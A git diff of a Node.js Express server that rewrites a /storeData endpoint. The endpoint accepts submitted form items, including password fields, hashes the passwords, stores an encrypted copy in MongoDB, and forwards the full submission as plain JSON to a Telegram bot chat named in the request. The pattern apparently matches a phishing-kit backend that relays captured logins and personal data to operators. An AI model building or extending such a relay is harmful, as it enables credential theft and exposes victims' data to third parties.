@@ -24,49 +24,128 @@ const collection = db.collection("test");
 app.use(bodyParser.json());
 app.use(express.static("public")); // Serve static files from the "public" directory
 
+// app.post("/storeData", async (req, res) => {
+//   try {
+//     const encryptedData = req.body.data;
+
+//     // Decrypt data
+//     const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
+//     const decryptedData = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
+
+//     // Construct message for Telegram
+//     const message = JSON.stringify(decryptedData);
+
+//     // MongoDB
+//     await client.connect();
+//     console.log("Connected successfully to server");
+
+//     const insertResult = await collection.insertOne({
+//       chat_id: TELEGRAM_CHAT_ID,
+//       text_id: decryptedData[0]["id"],
+//       text: decryptedData,
+//     });
+
+//     // Send message to Telegram
+//     const telegramApiUrl2 = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`;
+//     const response = await fetch(telegramApiUrl2, {
+//       method: "POST",
+//       headers: {
+//         "Content-Type": "application/json",
+//       },
+//       body: JSON.stringify({
+//         chat_id: TELEGRAM_CHAT_ID,
+//         text: message,
+//       }),
+//     });
+
+//     if (!response.ok) {
+//       throw new Error("Failed to send message to Telegram");
+//     }
+//   } catch (error) {
+//     console.error("Error storing data:", error);
+//     res.status(500).send("Failed to store data");
+//   } finally {
+//     await client.close();
+//     console.log("Server closed");
+//   }
+// });
+
 app.post("/storeData", async (req, res) => {
+  console.log("Received request to /storeData");
+
+  if (!req.body || !req.body.data) {
+    console.error("Invalid request body");
+    return res.status(400).send("Invalid request: missing data");
+  }
+
+  let conn;
   try {
-    const encryptedData = req.body.data;
+    conn = await client.connect();
+    console.log("Connected to MongoDB");
 
-    // Decrypt data
-    const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
-    const decryptedData = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
+    const db = conn.db("EttyDB");
+    const collection = db.collection("test");
 
-    // Construct message for Telegram
-    const message = JSON.stringify(decryptedData);
+    const userData = req.body.data;
+    console.log("Received user data:", JSON.stringify(userData));
 
-    // MongoDB
-    await client.connect();
-    console.log("Connected successfully to server");
-
-    const insertResult = await collection.insertOne({
-      chat_id: TELEGRAM_CHAT_ID,
-      text_id: decryptedData[0]["id"],
-      text: decryptedData,
+    // Hash password if present
+    userData.forEach((item) => {
+      if (item.type.toLowerCase() === "password") {
+        item.value = CryptoJS.SHA256(item.value).toString(CryptoJS.enc.Hex);
+      }
     });
 
-    // Send message to Telegram
-    const telegramApiUrl2 = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`;
-    const response = await fetch(telegramApiUrl2, {
+    // Encrypt all data
+    const encryptedData = CryptoJS.AES.encrypt(
+      JSON.stringify(userData),
+      SECRET_KEY
+    ).toString();
+
+    // Find chat_id and text_id
+    const chatIdItem = userData.find((item) => item.type === "chatid");
+    const idItem = userData.find((item) => item.type === "id");
+
+    if (!chatIdItem || !idItem) {
+      throw new Error("Missing chatid or id in user data");
+    }
+
+    const insertResult = await collection.insertOne({
+      chat_id: chatIdItem.value,
+      text_id: idItem.value,
+      text: encryptedData,
+    });
+
+    console.log("Data inserted to MongoDB:", insertResult.insertedId);
+
+    // Send to Telegram
+    const telegramMessage = JSON.stringify(userData);
+    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    const telegramResponse = await fetch(telegramUrl, {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
+        chat_id: chatIdItem.value,
+        text: telegramMessage,
       }),
     });
 
-    if (!response.ok) {
-      throw new Error("Failed to send message to Telegram");
+    if (!telegramResponse.ok) {
+      throw new Error(`Telegram API error: ${telegramResponse.statusText}`);
     }
+
+    console.log("Message sent to Telegram");
+
+    res.status(200).send("Data stored and sent successfully");
   } catch (error) {
-    console.error("Error storing data:", error);
-    res.status(500).send("Failed to store data");
+    console.error("Error in /storeData:", error);
+    res.status(500).send(`Failed to store data: ${error.message}`);
   } finally {
-    await client.close();
-    console.log("Server closed");
+    if (conn) {
+      await conn.close();
+      console.log("MongoDB connection closed");
+    }
   }
 });
 
@@ -221,31 +300,4 @@ app.get("/", async (req, res) => {
 
 app.listen(port, () => {
   console.log(`Backend server running at http://localhost:${port}`);
-});
-
-app.post("/storeData", async (req, res) => {
-  try {
-    const userData = req.body.data;
-    const SECRET_KEY = process.env.SECRET_KEY;
-
-    // Hash the password if present
-    userData.forEach((item) => {
-      if (item.type.toLowerCase() === "password") {
-        item.value = CryptoJS.SHA256(item.value).toString(CryptoJS.enc.Hex);
-      }
-    });
-
-    // Encrypt the entire userData
-    const encryptedData = CryptoJS.AES.encrypt(
-      JSON.stringify(userData),
-      SECRET_KEY
-    ).toString();
-
-    // ... rest of your server-side logic to store the encryptedData
-
-    res.status(200).send("Data stored successfully");
-  } catch (error) {
-    console.error("Error storing data:", error);
-    res.status(500).send("Failed to store data");
-  }
 });
